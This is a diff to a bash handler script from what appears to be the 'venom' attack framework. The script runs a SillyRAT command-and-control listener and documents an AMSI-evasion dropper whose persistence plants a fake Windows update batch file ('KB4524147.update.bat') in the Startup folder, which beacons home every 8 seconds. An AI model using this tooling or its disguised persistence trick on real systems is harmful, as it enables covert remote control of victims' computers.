@@ -34,7 +34,7 @@ Colors;
 
 ## Check for handler dependencies
 if ! [ -e "server.py" ]; then
-   echo ${RedF}"- server.py not found in current directory .."
+   echo ${RedF}"[ERROR] server.py not found in current directory .."
    sleep 2 && exit
 fi
 
@@ -48,9 +48,17 @@ echo "    LHOST        : $LHOST"
 echo "    ACTIVE ON    : ${RedF}$FIRST_ACCESS${BlueF}"
 echo "    LAST ACCESS  : $LAST_ACCESS"
 echo "    DROPPERNAME  : $DROPPER"
-echo "    VENOM IDENT  : Amsi Evasion (agent nº6)"
+echo "    CATEGORIE    : Amsi Evasion (agent nº6)"
 echo "    AGENT RPATH  : $RPATH"
 echo "    PERSISTENCE  : %appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat"
+echo ""
+echo "    Detail Description"
+echo "    ------------------"
+echo "    If sellected 'add persistence' to dropper in venom amsi evasion agent nº6"
+echo "    Them the dropper when executed it will create in remote target startup folder"
+echo "    one script named 'KB4524147.update.bat' that beacons home from 8 to 8 sec"
+echo "    on every target startup until a valid tcp connection is found (client.py)."
+echo "    'Venom also creates this handler file (zip) to store persistence settings'."
 echo "" && echo ${BlueF}:Press ${YellowF}"'ENTER'"${BlueF} to continue ..${Reset}
 read op
 cls
@@ -67,6 +75,7 @@ xterm -T " SILLYRAT LISTENER => $LHOST:$LPORT" -geometry 110x23 -e "python3 serv
 dtr=$(date|awk {'print $2,$3,$4,$5'})
 LAST=$(cat handler.sh | egrep -m 1 "LAST_ACCESS") > /dev/null 2>&1
 sed -i "s|$LAST|LAST_ACCESS='$dtr'|" handler.sh
+service apache2 stop > /dev/null 2>&1
 cls
 }
 
@@ -77,7 +86,6 @@ echo ${YellowF}"Compressing (zip) handler files ..";sleep 2
 ## zip handler files (settings/certificates)
 zip handler_ID:$ID.zip handler.sh server.py README -m -q
 ## exit
-service apache2 stop > /dev/null 2>&1
 exit
 }
 
